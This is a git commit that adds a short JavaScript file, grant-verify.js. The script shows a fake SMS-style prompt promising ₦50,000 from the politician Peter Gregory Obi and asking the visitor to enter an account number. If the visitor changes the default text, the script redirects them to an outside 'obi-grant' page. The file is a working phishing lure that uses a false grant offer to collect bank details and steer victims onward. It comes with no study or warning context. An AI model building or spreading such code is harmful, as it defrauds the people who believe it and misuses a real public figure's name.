838131b594f475eed01e2e48d322b2369240d445
newblog13 <sweet16guyz@gmail.com>
2026-05-17 08:11:08 +0100

    Create grant-verify.js

---
+++ grant-verify.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW ₦50,000'
+password=prompt('SMS: Congratulations, you are eligible to receive ₦50,000 From Peter Gregory Obi, click OK to Enter Your Acc. Number','WITHDRAW ₦50,000');
+if (password != 'WITHDRAW ₦50,000') {
+location.href='https://phivez.org/obi-grant.html';
+}
